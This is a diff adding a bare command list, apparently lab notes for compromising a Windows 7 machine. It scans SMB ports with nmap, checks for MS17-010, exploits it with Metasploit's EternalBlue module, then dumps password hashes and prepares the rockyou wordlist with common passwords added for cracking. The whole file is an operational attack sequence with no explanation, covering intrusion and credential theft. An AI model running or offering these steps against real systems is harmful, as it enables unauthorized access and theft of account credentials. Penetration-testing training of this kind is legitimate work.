@@ -1,0 +1,36 @@
+sudo msfdb init
+sudo msfconsole
+
+nmap -Pn -p445 <Windows7_IP>
+nmap -Pn -p445 --open --max-hostgroup 3 <Windows7_IP>
+
+nmap -Pn -p21,22,53,137-139,631,3389 <Windows7_IP>
+
+cd /usr/share/metasploit-framework/modules/auxiliary/scanner/smb
+
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS <Windows7_IP>
+run
+
+search type:exploit platform:windows eternalblue
+
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+
+set RHOSTS <Windows7_IP>
+set target 0
+exploit
+
+help
+
+screenshot
+
+hashdump
+
+cp /usr/share/wordlists/rockyou.txt.gz ~/
+gunzip rockyou.txt.gz
+echo "password" >> rockyou.txt
+echo "P@ssword" >> rockyou.txt
+echo "P@ssw0rd" >> rockyou.txt
+echo "123456" >> rockyou.txt
+echo "12345678" >> rockyou.txt
